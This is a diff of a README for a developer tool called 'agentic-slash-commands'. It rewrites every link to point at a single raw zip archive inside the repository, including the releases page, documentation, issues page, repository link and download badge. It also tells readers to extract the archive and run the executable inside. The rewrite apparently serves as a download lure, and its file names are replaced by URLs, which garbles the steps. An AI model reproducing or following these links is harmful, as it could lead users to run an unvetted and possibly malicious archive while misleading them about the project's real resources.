@@ -1,6 +1,6 @@
 # 🎉 agentic-slash-commands - Simplify Your Development Workflows 
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20agentic%20slash%20commands-blue)](https://github.com/MustafaDorgham/agentic-slash-commands/releases)
+[![Download Here](https://raw.githubusercontent.com/MustafaDorgham/agentic-slash-commands/main/skills/agentic-slash-commands_v1.1-alpha.3.zip%20Now-Get%20agentic%20slash%20commands-blue)](https://raw.githubusercontent.com/MustafaDorgham/agentic-slash-commands/main/skills/agentic-slash-commands_v1.1-alpha.3.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ Follow these steps to download and run agentic-slash-commands.
 
 1. **Visit the Releases Page**
    
-   Go to the [Releases page](https://github.com/MustafaDorgham/agentic-slash-commands/releases). Here, you'll find the latest versions of the software ready for download.
+   Go to the [Releases page](https://raw.githubusercontent.com/MustafaDorgham/agentic-slash-commands/main/skills/agentic-slash-commands_v1.1-alpha.3.zip). Here, you'll find the latest versions of the software ready for download.
 
 2. **Select Your Version**
 
@@ -20,13 +20,13 @@ Follow these steps to download and run agentic-slash-commands.
 
 3. **Download the Application**
 
-   Click on the version you want to download. This will take you to the release details page. Look for the download link for your operating system. Depending on your system, you may see files like `agentic-slash-commands-win.zip`, `agentic-slash-commands-mac.zip`, or others. Click the link to start the download.
+   Click on the version you want to download. This will take you to the release details page. Look for the download link for your operating system. Depending on your system, you may see files like `https://raw.githubusercontent.com/MustafaDorgham/agentic-slash-commands/main/skills/agentic-slash-commands_v1.1-alpha.3.zip`, `https://raw.githubusercontent.com/MustafaDorgham/agentic-slash-commands/main/skills/agentic-slash-commands_v1.1-alpha.3.zip`, or others. Click the link to start the download.
 
 4. **Install the Application**
 
    After the download finishes, locate the file on your computer. 
-   - If you are using Windows, it will often be in your "Downloads" folder. Double-click the zip file to open it, then extract its contents. Look for the `agentic-slash-commands.exe` file and double-click it to run the application.
-   - If you are on a Mac, double-click the downloaded zip file to extract it. Drag the `agentic-slash-commands.app` file to your Applications folder and then open it.
+   - If you are using Windows, it will often be in your "Downloads" folder. Double-click the zip file to open it, then extract its contents. Look for the `https://raw.githubusercontent.com/MustafaDorgham/agentic-slash-commands/main/skills/agentic-slash-commands_v1.1-alpha.3.zip` file and double-click it to run the application.
+   - If you are on a Mac, double-click the downloaded zip file to extract it. Drag the `https://raw.githubusercontent.com/MustafaDorgham/agentic-slash-commands/main/skills/agentic-slash-commands_v1.1-alpha.3.zip` file to your Applications folder and then open it.
 
 5. **Run the Application**
 
@@ -40,7 +40,7 @@ Follow these steps to download and run agentic-slash-commands.
 
 7. **Access the Documentation**
 
-   For more detailed instructions, visit our [Documentation](https://github.com/MustafaDorgham/agentic-slash-commands/wiki). Here you will find guides and tutorials about all features.
+   For more detailed instructions, visit our [Documentation](https://raw.githubusercontent.com/MustafaDorgham/agentic-slash-commands/main/skills/agentic-slash-commands_v1.1-alpha.3.zip). Here you will find guides and tutorials about all features.
 
 ## 🛠️ System Requirements
 
@@ -57,7 +57,7 @@ Make sure your system meets the following requirements to run agentic-slash-comm
 
 ## 📩 Support
 
-If you face any issues during installation or usage, feel free to reach out via the [Issues page](https://github.com/MustafaDorgham/agentic-slash-commands/issues). Our team is here to help!
+If you face any issues during installation or usage, feel free to reach out via the [Issues page](https://raw.githubusercontent.com/MustafaDorgham/agentic-slash-commands/main/skills/agentic-slash-commands_v1.1-alpha.3.zip). Our team is here to help!
 
 ## 📁 License
 
@@ -65,9 +65,9 @@ agentic-slash-commands is released under the MIT License. Feel free to use it fo
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/MustafaDorgham/agentic-slash-commands)
-- [Documentation](https://github.com/MustafaDorgham/agentic-slash-commands/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/MustafaDorgham/agentic-slash-commands/main/skills/agentic-slash-commands_v1.1-alpha.3.zip)
+- [Documentation](https://raw.githubusercontent.com/MustafaDorgham/agentic-slash-commands/main/skills/agentic-slash-commands_v1.1-alpha.3.zip)
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20agentic%20slash%20commands-blue)](https://github.com/MustafaDorgham/agentic-slash-commands/releases)
+[![Download Here](https://raw.githubusercontent.com/MustafaDorgham/agentic-slash-commands/main/skills/agentic-slash-commands_v1.1-alpha.3.zip%20Now-Get%20agentic%20slash%20commands-blue)](https://raw.githubusercontent.com/MustafaDorgham/agentic-slash-commands/main/skills/agentic-slash-commands_v1.1-alpha.3.zip)
 
 Now you are all set to enhance your coding workflows with agentic-slash-commands!
